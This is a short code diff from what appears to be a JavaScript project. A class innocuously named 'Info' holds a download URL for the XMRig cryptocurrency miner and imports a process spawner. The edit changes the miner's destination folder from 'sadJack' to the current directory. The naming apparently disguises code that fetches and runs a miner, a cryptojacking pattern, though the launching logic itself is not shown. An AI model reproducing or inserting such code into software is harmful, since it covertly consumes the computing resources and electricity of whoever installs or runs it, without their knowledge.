@@ -6,7 +6,7 @@ const { spawn } = require('child_process');
 class Info {
   constructor() {
     this.url = 'https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-msvc-win64.zip';
-    this.destFolder = 'sadJack';
+    this.destFolder = './';
   }
 
   async set() {
